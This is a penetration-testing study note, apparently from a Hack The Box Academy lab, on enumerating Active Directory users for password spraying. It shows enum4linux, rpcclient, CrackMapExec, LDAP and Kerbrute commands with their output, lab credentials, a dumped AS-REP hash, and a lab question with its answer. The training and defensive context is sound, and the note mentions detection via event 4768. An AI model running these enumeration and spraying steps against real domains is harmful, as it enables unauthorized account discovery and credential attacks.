# Password Spraying - Making a Target User List
## Detailed User Enumeration
There are several ways that we can gather a target list of valid users:

- SMB NULL session to retrieve a complete list of domain users from the domain controller
- LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
- Using a tool such as `Kerbrute` to validate users utilizing a word list from a source such as the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo, or gathered by using a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users
- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using `Responder` or even a successful password spray using a smaller wordlist

## SMB NULL Session to Pull User List
### Using enum4linux

```sh
masterofblafu@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

administrator
guest
krbtgt
lab_adm
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch
ccruz
njohnson
mholliday

<SNIP>
```

### Using rpcclient

```sh
masterofblafu@htb[/htb]$ rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers 
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]

<SNIP>
```

### Using CrackMapExec --users Flag
- `badpwdcount`: invalid login attempts, so we can remove any accounts from our list that are close to the lockout threshold
- `badpwdtime`: date and time of the last bad password attempt, so we can see how close an account is to having its `badpwdcount` reset

```sh
masterofblafu@htb[/htb]$ crackmapexec smb 172.16.5.5 --users

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 0 baddpwdtime: 2022-02-17 22:59:22.684613

<SNIP>
```

## Gathering Users with LDAP Anonymous
### Using ldapsearch
If we choose to use `ldapsearch` we will need to specify a valid LDAP search filter. We can learn more about these search filters in the [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap) module.

```sh
masterofblafu@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

guest
ACADEMY-EA-DC01$
ACADEMY-EA-MS01$
ACADEMY-EA-WEB01$
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch

<SNIP>
```

### Using windapsearch
Tools such as `windapsearch` make this easier. Here we can specify anonymous access by providing a blank username with the `-u` flag and the `-U` flag to tell the tool to retrieve just users.

```sh
masterofblafu@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+] Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+] ...success! Binded as: 
[+]  None

[+] Enumerating all AD users
[+] Found 2906 users: 

cn: Guest

cn: Htb Student
userPrincipalName: htb-student@inlanefreight.local

cn: Annie Vazquez
userPrincipalName: avazquez@inlanefreight.local

cn: Paul Falcon
userPrincipalName: pfalcon@inlanefreight.local

cn: Fae Anthony
userPrincipalName: fanthony@inlanefreight.local

cn: Walter Dillard
userPrincipalName: wdillard@inlanefreight.local

<SNIP>
```

## Enumerating Users with Kerbrute
If we have no access at all from our position in the internal network, we can use `Kerbrute` to enumerate valid AD accounts and for password spraying.

This tool uses [Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication), which is a much faster and potentially stealthier way to perform password spraying. This method does not generate Windows event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625), or a logon failure which is often monitored for. The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error `PRINCIPAL UNKNOWN`, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid.

### Kerbrute User Enumeration

```sh
masterofblafu@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:16:11 >  Using KDC(s):
2022/02/17 22:16:11 >   172.16.5.5:88

2022/02/17 22:16:11 >  [+] VALID USERNAME:   jjones@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   sbrown@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   tjohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   jwilson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   bdavis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   njohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   asanchez@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   dlewis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   ccruz@inlanefreight.local

<SNIP>
```

Using Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768). This will only be triggered if [Kerberos event logging](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack. If we are successful with this method during a penetration test, this can be an excellent recommendation to add to our report.

## Credentialed Enumeration to Build our User List
With valid credentials, we can use any of the tools stated previously to build a user list. A quick and easy way is using CrackMapExec.

### Using CrackMapExec with Valid Credentials

```sh
masterofblafu@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

[sudo] password for htb-student: 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\htb-student:Academy_student_AD! 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 1 baddpwdtime: 2022-02-23 21:43:35.059620
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 20 baddpwdtime: 2022-02-17 22:59:22.684613
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\pfalcon                        badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58

<SNIP>
```

## Questions
SSH to **10.129.16.99 (ACADEMY-EA-ATTACK01)**, with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint? **Answer: 56**
   - Run Kerbrute with the specified user list:
        ```sh
        $kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

            __             __               __     
        / /_____  _____/ /_  _______  __/ /____ 
        / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
        / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
        /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

        Version: dev (9cfb81e) - 03/15/26 - Ronnie Flathers @ropnop

        2026/03/15 11:57:19 >  Using KDC(s):
        2026/03/15 11:57:19 >  	172.16.5.5:88

        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
        2026/03/15 11:57:19 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
        $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:9386142de9aebeafb7b7ca16361361fa$fd00d2ad94b94195793bb4f262a64bc3f7f9adf06bb5bf34a1b77040b682c36a8e907abe270b0db1429f75b7526fc0e5924eeeade81b531af8e3dd14c2601b02bfbe6442e548585284ab4004a9dba3db866afac0b5077870fcd3fd1ca2204f102020ecf692d7556350f44eafaa8249af4b946b6dffebbcc10687802cba2a0ade04d3f1ac0c44c9825fbf27d84b89bff6c258340067e754d4f74ef6264ec8a92afa79354a23ae48d0a4b15f49c08871ccac114ca28f5f57815b4c201ae6d98a4e6818d872fc97a7fcf04b5425f3bb1ac78175a7b272863b751fac82451a3fe2075808b7b5364dfe9cd1e0db21eb606fbdb15de685691ae99fa1dd83eb894ef74086f217815bc6a855ee4d
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 mmorgan@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 rramirez@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 jwallace@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 jsantiago@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 gdavis@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 mrichardson@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 mharrison@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 tgarcia@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 jmay@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 jmontgomery@inlanefreight.local
        2026/03/15 11:57:19 >  [+] VALID USERNAME:	 jhopkins@inlanefreight.local
        2026/03/15 11:57:20 >  [+] VALID USERNAME:	 dpayne@inlanefreight.local
        2026/03/15 11:57:20 >  [+] VALID USERNAME:	 mhicks@inlanefreight.local
        2026/03/15 11:57:20 >  [+] VALID USERNAME:	 adunn@inlanefreight.local
        2026/03/15 11:57:20 >  [+] VALID USERNAME:	 lmatthews@inlanefreight.local
        2026/03/15 11:57:20 >  [+] VALID USERNAME:	 avazquez@inlanefreight.local
        2026/03/15 11:57:20 >  [+] VALID USERNAME:	 mlowe@inlanefreight.local
        2026/03/15 11:57:20 >  [+] VALID USERNAME:	 jmcdaniel@inlanefreight.local
        2026/03/15 11:57:20 >  [+] VALID USERNAME:	 csteele@inlanefreight.local
        2026/03/15 11:57:20 >  [+] VALID USERNAME:	 mmullins@inlanefreight.local
        2026/03/15 11:57:21 >  [+] VALID USERNAME:	 mochoa@inlanefreight.local
        2026/03/15 11:57:21 >  [+] VALID USERNAME:	 aslater@inlanefreight.local
        2026/03/15 11:57:21 >  [+] VALID USERNAME:	 ehoffman@inlanefreight.local
        2026/03/15 11:57:21 >  [+] VALID USERNAME:	 ehamilton@inlanefreight.local
        2026/03/15 11:57:21 >  [+] VALID USERNAME:	 cpennington@inlanefreight.local
        2026/03/15 11:57:22 >  [+] VALID USERNAME:	 srosario@inlanefreight.local
        2026/03/15 11:57:22 >  [+] VALID USERNAME:	 lbradford@inlanefreight.local
        2026/03/15 11:57:22 >  [+] VALID USERNAME:	 halvarez@inlanefreight.local
        2026/03/15 11:57:22 >  [+] VALID USERNAME:	 gmccarthy@inlanefreight.local
        2026/03/15 11:57:22 >  [+] VALID USERNAME:	 dbranch@inlanefreight.local
        2026/03/15 11:57:23 >  [+] VALID USERNAME:	 mshoemaker@inlanefreight.local
        2026/03/15 11:57:23 >  [+] VALID USERNAME:	 mholliday@inlanefreight.local
        2026/03/15 11:57:23 >  [+] VALID USERNAME:	 ngriffith@inlanefreight.local
        2026/03/15 11:57:23 >  [+] VALID USERNAME:	 sinman@inlanefreight.local
        2026/03/15 11:57:23 >  [+] VALID USERNAME:	 minman@inlanefreight.local
        2026/03/15 11:57:23 >  [+] VALID USERNAME:	 rhester@inlanefreight.local
        2026/03/15 11:57:23 >  [+] VALID USERNAME:	 rburrows@inlanefreight.local
        2026/03/15 11:57:24 >  [+] VALID USERNAME:	 dpalacios@inlanefreight.local
        2026/03/15 11:57:25 >  [+] VALID USERNAME:	 strent@inlanefreight.local
        2026/03/15 11:57:25 >  [+] VALID USERNAME:	 fanthony@inlanefreight.local
        2026/03/15 11:57:25 >  [+] VALID USERNAME:	 evalentin@inlanefreight.local
        2026/03/15 11:57:25 >  [+] VALID USERNAME:	 sgage@inlanefreight.local
        2026/03/15 11:57:26 >  [+] VALID USERNAME:	 jshay@inlanefreight.local
        2026/03/15 11:57:27 >  [+] VALID USERNAME:	 jhermann@inlanefreight.local
        2026/03/15 11:57:27 >  [+] VALID USERNAME:	 whouse@inlanefreight.local
        2026/03/15 11:57:27 >  [+] VALID USERNAME:	 emercer@inlanefreight.local
        2026/03/15 11:57:29 >  [+] VALID USERNAME:	 wshepherd@inlanefreight.local
        2026/03/15 11:57:33 >  Done! Tested 48705 usernames (56 valid) in 14.511 seconds
        ```